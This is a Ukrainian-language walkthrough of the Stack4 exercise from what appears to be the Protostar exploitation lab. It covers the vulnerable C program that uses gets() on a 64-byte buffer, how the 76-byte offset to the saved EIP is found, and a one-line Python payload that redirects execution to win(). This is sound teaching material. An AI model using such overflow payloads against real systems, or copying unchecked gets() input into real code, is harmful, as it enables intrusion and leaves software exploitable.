# STACK4

Цей рівень розглядає перезапис збереженого EIP і стандартне переповнення буфера.

Вихідний код для Stack4:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
У цій вправі ми будемо орієнтуватися на адресу повернення основної функції, EIP. Простіше кажучи, коли програма або функція завершує виконання, вона повинна повернутися до того, що її викликає. Ця адреса зберігається в стеку на початку фрейму. 

Переповнити буфер і збільшувати його, щоб визначити при якій кількості байтів ми отримаємо повідомлення про segmentation fault.

![image](https://user-images.githubusercontent.com/47494881/147489283-83764b42-e061-4dc2-846a-af62af1bcd66.png)

Щоразу я збільшувався на 4, оскільки EIP займає чотири байти. У будь-якому випадку, ми можемо сказати, що після 76 байт є область, яка перезаписує EIP, тому нам знадобиться 76 'а' і адреса win в Little Endian

Щоб знайти адресу функції win скористаємось командою objdump.

![image](https://user-images.githubusercontent.com/47494881/147489530-8139c2b5-57f3-429e-a737-1a8f64eaed6d.png)

Наша виграшна адреса 0x080483f4. Тепер нам просто потрібно використовувати Python, щоб надрукувати 76 ‘a’, а потім адресу в Little Endian.
```
python -c "print('a' * 76 + '\xf4\x83\x04\x08')" | ./stack4
```
![image](https://user-images.githubusercontent.com/47494881/147489760-96bbeaac-dd7b-40ff-81b4-fede045a4d20.png)
